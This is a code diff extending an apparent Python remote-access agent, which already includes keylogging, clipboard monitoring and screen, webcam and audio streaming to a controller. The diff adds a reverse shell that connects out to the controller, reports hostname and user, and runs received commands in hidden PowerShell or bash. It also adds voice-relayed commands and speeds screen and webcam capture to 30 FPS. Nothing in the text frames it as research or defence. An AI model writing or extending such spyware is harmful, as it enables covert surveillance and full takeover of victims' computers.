@@ -23,6 +23,17 @@ from pynput import keyboard
 import pygame
 import io
 import wave
+import socket
+import json
+import asyncio
+import websockets
+try:
+    import speech_recognition as sr
+    SPEECH_RECOGNITION_AVAILABLE = True
+except ImportError:
+    SPEECH_RECOGNITION_AVAILABLE = False
+import psutil
+from PIL import Image
 
 SERVER_URL = "http://localhost:8080"  # Change to your controller's URL
 
@@ -33,6 +44,16 @@ AUDIO_STREAMING_ENABLED = False
 AUDIO_STREAM_THREAD = None
 CAMERA_STREAMING_ENABLED = False
 CAMERA_STREAM_THREAD = None
+
+# --- Reverse Shell State ---
+REVERSE_SHELL_ENABLED = False
+REVERSE_SHELL_THREAD = None
+REVERSE_SHELL_SOCKET = None
+
+# --- Voice Control State ---
+VOICE_CONTROL_ENABLED = False
+VOICE_CONTROL_THREAD = None
+VOICE_RECOGNIZER = None
 
 # --- Monitoring State ---
 KEYLOGGER_ENABLED = False
@@ -78,7 +99,7 @@ def get_or_create_agent_id():
 
 def stream_screen(agent_id):
     """
-    Captures the screen and streams it to the controller.
+    Captures the screen and streams it to the controller at high FPS.
     This function runs in a separate thread.
     """
     global STREAMING_ENABLED
@@ -86,31 +107,56 @@ def stream_screen(agent_id):
     headers = {'Content-Type': 'image/jpeg'}
 
     with mss.mss() as sct:
+        # Optimize for high FPS
+        target_fps = 30
+        frame_time = 1.0 / target_fps
+        last_frame_time = time.time()
+        
         while STREAMING_ENABLED:
             try:
+                current_time = time.time()
+                
                 # Get raw pixels from the screen
                 sct_img = sct.grab(sct.monitors[1])
                 
                 # Create an OpenCV image
                 img = np.array(sct_img)
                 
-                # Encode the image as JPEG with 70% quality
-                is_success, buffer = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                # Resize for better performance if screen is too large
+                height, width = img.shape[:2]
+                if width > 1920:
+                    scale = 1920 / width
+                    new_width = int(width * scale)
+                    new_height = int(height * scale)
+                    img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
+                
+                # Encode the image as JPEG with optimized quality for speed
+                is_success, buffer = cv2.imencode(".jpg", img, [
+                    cv2.IMWRITE_JPEG_QUALITY, 85,
+                    cv2.IMWRITE_JPEG_OPTIMIZE, 1
+                ])
                 if not is_success:
                     continue
 
-                # Send the frame to the controller
-                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
+                # Send the frame to the controller asynchronously
+                try:
+                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
+                except requests.exceptions.Timeout:
+                    pass  # Skip frame if timeout
                 
-                # Control frame rate to ~10 FPS
-                time.sleep(0.1)
+                # Maintain target FPS
+                elapsed = time.time() - current_time
+                sleep_time = max(0, frame_time - elapsed)
+                if sleep_time > 0:
+                    time.sleep(sleep_time)
+                    
             except Exception as e:
                 print(f"Stream error: {e}")
-                time.sleep(2) # Wait before retrying
+                time.sleep(1) # Shorter wait before retrying
 
 def stream_camera(agent_id):
     """
-    Captures the webcam and streams it to the controller.
+    Captures the webcam and streams it to the controller at high FPS.
     This function runs in a separate thread.
     """
     global CAMERA_STREAMING_ENABLED
@@ -119,28 +165,59 @@ def stream_camera(agent_id):
 
     try:
         # Use CAP_DSHOW on Windows for better device compatibility and performance.
-        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        if WINDOWS_AVAILABLE:
+            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        else:
+            cap = cv2.VideoCapture(0)
+            
         if not cap.isOpened():
             print("Cannot open webcam")
             CAMERA_STREAMING_ENABLED = False
             return
+            
+        # Set camera properties for higher FPS
+        cap.set(cv2.CAP_PROP_FPS, 30)
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Reduce buffer for lower latency
+        
     except Exception as e:
         print(f"Could not open webcam: {e}")
         CAMERA_STREAMING_ENABLED = False
         return
 
+    target_fps = 30
+    frame_time = 1.0 / target_fps
+    
     while CAMERA_STREAMING_ENABLED:
         try:
+            current_time = time.time()
+            
             ret, frame = cap.read()
             if not ret:
                 break
-            is_success, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                
+            # Optimize frame quality for speed
+            is_success, buffer = cv2.imencode(".jpg", frame, [
+                cv2.IMWRITE_JPEG_QUALITY, 85,
+                cv2.IMWRITE_JPEG_OPTIMIZE, 1
+            ])
             if is_success:
-                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
-            time.sleep(0.1) # ~10 FPS
+                try:
+                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
+                except requests.exceptions.Timeout:
+                    pass  # Skip frame if timeout
+                    
+            # Maintain target FPS
+            elapsed = time.time() - current_time
+            sleep_time = max(0, frame_time - elapsed)
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+                
         except Exception as e:
             print(f"Camera stream error: {e}")
-            break
+            time.sleep(1)
+            
     cap.release()
 
 def stream_audio(agent_id):
@@ -228,6 +305,231 @@ def stop_camera_streaming():
             CAMERA_STREAM_THREAD.join(timeout=2)
         CAMERA_STREAM_THREAD = None
         print("Stopped camera stream.")
+
+# --- Reverse Shell Functions ---
+
+def reverse_shell_handler(agent_id):
+    """
+    Handles reverse shell connections and command execution.
+    This function runs in a separate thread.
+    """
+    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_SOCKET
+    
+    try:
+        # Create socket connection back to controller
+        REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        controller_host = SERVER_URL.split("://")[1].split(":")[0]  # Extract host from SERVER_URL
+        controller_port = 9999  # Dedicated port for reverse shell
+        
+        REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
+        print(f"Reverse shell connected to {controller_host}:{controller_port}")
+        
+        # Send initial connection info
+        system_info = {
+            "agent_id": agent_id,
+            "hostname": socket.gethostname(),
+            "platform": os.name,
+            "cwd": os.getcwd(),
+            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
+        }
+        REVERSE_SHELL_SOCKET.send(json.dumps(system_info).encode() + b'\n')
+        
+        while REVERSE_SHELL_ENABLED:
+            try:
+                # Receive command from controller
+                data = REVERSE_SHELL_SOCKET.recv(4096)
+                if not data:
+                    break
+                    
+                command = data.decode().strip()
+                if not command:
+                    continue
+                    
+                # Handle special commands
+                if command.lower() == "exit":
+                    break
+                elif command.startswith("cd "):
+                    try:
+                        path = command[3:].strip()
+                        os.chdir(path)
+                        response = f"Changed directory to: {os.getcwd()}\n"
+                    except Exception as e:
+                        response = f"cd error: {str(e)}\n"
+                else:
+                    # Execute regular command
+                    try:
+                        if WINDOWS_AVAILABLE:
+                            result = subprocess.run(
+                                ["powershell.exe", "-NoProfile", "-Command", command],
+                                capture_output=True,
+                                text=True,
+                                timeout=30,
+                                creationflags=subprocess.CREATE_NO_WINDOW
+                            )
+                        else:
+                            result = subprocess.run(
+                                ["bash", "-c", command],
+                                capture_output=True,
+                                text=True,
+                                timeout=30
+                            )
+                        response = result.stdout + result.stderr
+                        if not response:
+                            response = "[Command executed successfully - no output]\n"
+                    except subprocess.TimeoutExpired:
+                        response = "[Command timed out after 30 seconds]\n"
+                    except Exception as e:
+                        response = f"[Command execution error: {str(e)}]\n"
+                
+                # Send response back
+                REVERSE_SHELL_SOCKET.send(response.encode())
+                
+            except socket.timeout:
+                continue
+            except Exception as e:
+                print(f"Reverse shell error: {e}")
+                break
+                
+    except Exception as e:
+        print(f"Reverse shell connection error: {e}")
+    finally:
+        if REVERSE_SHELL_SOCKET:
+            try:
+                REVERSE_SHELL_SOCKET.close()
+            except:
+                pass
+        REVERSE_SHELL_SOCKET = None
+        print("Reverse shell disconnected")
+
+def start_reverse_shell(agent_id):
+    """Start the reverse shell connection."""
+    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
+    if not REVERSE_SHELL_ENABLED:
+        REVERSE_SHELL_ENABLED = True
+        REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
+        REVERSE_SHELL_THREAD.daemon = True
+        REVERSE_SHELL_THREAD.start()
+        print("Started reverse shell.")
+
+def stop_reverse_shell():
+    """Stop the reverse shell connection."""
+    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
+    if REVERSE_SHELL_ENABLED:
+        REVERSE_SHELL_ENABLED = False
+        if REVERSE_SHELL_SOCKET:
+            try:
+                REVERSE_SHELL_SOCKET.close()
+            except:
+                pass
+        if REVERSE_SHELL_THREAD:
+            REVERSE_SHELL_THREAD.join(timeout=2)
+        REVERSE_SHELL_THREAD = None
+        print("Stopped reverse shell.")
+
+# --- Voice Control Functions ---
+
+def voice_control_handler(agent_id):
+    """
+    Handles voice recognition and command processing.
+    This function runs in a separate thread.
+    """
+    global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
+    
+    if not SPEECH_RECOGNITION_AVAILABLE:
+        print("Speech recognition not available - install speechrecognition library")
+        return
+    
+    VOICE_RECOGNIZER = sr.Recognizer()
+    microphone = sr.Microphone()
+    
+    # Adjust for ambient noise
+    with microphone as source:
+        print("Adjusting for ambient noise... Please wait.")
+        VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
+        print("Voice control ready. Listening for commands...")
+    
+    while VOICE_CONTROL_ENABLED:
+        try:
+            with microphone as source:
+                # Listen for audio with timeout
+                audio = VOICE_RECOGNIZER.listen(source, timeout=1, phrase_time_limit=5)
+            
+            try:
+                # Recognize speech using Google Speech Recognition
+                command = VOICE_RECOGNIZER.recognize_google(audio).lower()
+                print(f"Voice command received: {command}")
+                
+                # Process voice commands
+                if "screenshot" in command or "screen shot" in command:
+                    execute_voice_command("screenshot", agent_id)
+                elif "open camera" in command or "start camera" in command:
+                    execute_voice_command("start-camera", agent_id)
+                elif "close camera" in command or "stop camera" in command:
+                    execute_voice_command("stop-camera", agent_id)
+                elif "start streaming" in command or "start stream" in command:
+                    execute_voice_command("start-stream", agent_id)
+                elif "stop streaming" in command or "stop stream" in command:
+                    execute_voice_command("stop-stream", agent_id)
+                elif "system info" in command or "system information" in command:
+                    execute_voice_command("systeminfo", agent_id)
+                elif "list processes" in command or "show processes" in command:
+                    if WINDOWS_AVAILABLE:
+                        execute_voice_command("Get-Process | Select-Object Name, Id | Format-Table", agent_id)
+                    else:
+                        execute_voice_command("ps aux", agent_id)
+                elif "current directory" in command or "where am i" in command:
+                    execute_voice_command("pwd", agent_id)
+                elif command.startswith("run ") or command.startswith("execute "):
+                    # Extract command after "run" or "execute"
+                    actual_command = command.split(" ", 1)[1] if " " in command else ""
+                    if actual_command:
+                        execute_voice_command(actual_command, agent_id)
+                else:
+                    print(f"Unknown voice command: {command}")
+                    
+            except sr.UnknownValueError:
+                # Speech not recognized - this is normal, just continue
+                pass
+            except sr.RequestError as e:
+                print(f"Could not request results from speech recognition service: {e}")
+                time.sleep(1)
+                
+        except sr.WaitTimeoutError:
+            # Timeout waiting for audio - this is normal, just continue
+            pass
+        except Exception as e:
+            print(f"Voice control error: {e}")
+            time.sleep(1)
+
+def execute_voice_command(command, agent_id):
+    """Execute a command received via voice control."""
+    try:
+        # Send command to controller for execution
+        url = f"{SERVER_URL}/voice_command/{agent_id}"
+        response = requests.post(url, json={"command": command}, timeout=5)
+        print(f"Voice command '{command}' sent to controller")
+    except Exception as e:
+        print(f"Error sending voice command: {e}")
+
+def start_voice_control(agent_id):
+    """Start voice control functionality."""
+    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
+    if not VOICE_CONTROL_ENABLED:
+        VOICE_CONTROL_ENABLED = True
+        VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
+        VOICE_CONTROL_THREAD.daemon = True
+        VOICE_CONTROL_THREAD.start()
+        print("Started voice control.")
+
+def stop_voice_control():
+    """Stop voice control functionality."""
+    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
+    if VOICE_CONTROL_ENABLED:
+        VOICE_CONTROL_ENABLED = False
+        if VOICE_CONTROL_THREAD:
+            VOICE_CONTROL_THREAD.join(timeout=2)
+        VOICE_CONTROL_THREAD = None
+        print("Stopped voice control.")
 
 # --- Keylogger Functions ---
 
@@ -476,6 +778,10 @@ def main_loop(agent_id):
         "stop-keylogger": stop_keylogger,
         "start-clipboard": lambda: start_clipboard_monitor(agent_id),
         "stop-clipboard": stop_clipboard_monitor,
+        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
+        "stop-reverse-shell": stop_reverse_shell,
+        "start-voice-control": lambda: start_voice_control(agent_id),
+        "stop-voice-control": stop_voice_control,
     }
 
     while True:
@@ -506,7 +812,8 @@ def main_loop(agent_id):
         # Adaptive sleep to reduce traffic when idle
         sleep_time = 1 if (STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or 
                           CAMERA_STREAMING_ENABLED or KEYLOGGER_ENABLED or 
-                          CLIPBOARD_MONITOR_ENABLED) else 5
+                          CLIPBOARD_MONITOR_ENABLED or REVERSE_SHELL_ENABLED or
+                          VOICE_CONTROL_ENABLED) else 5
         time.sleep(sleep_time)
 
 if __name__ == "__main__":
@@ -521,3 +828,5 @@ if __name__ == "__main__":
         stop_camera_streaming()
         stop_keylogger()
         stop_clipboard_monitor()
+        stop_reverse_shell()
+        stop_voice_control()
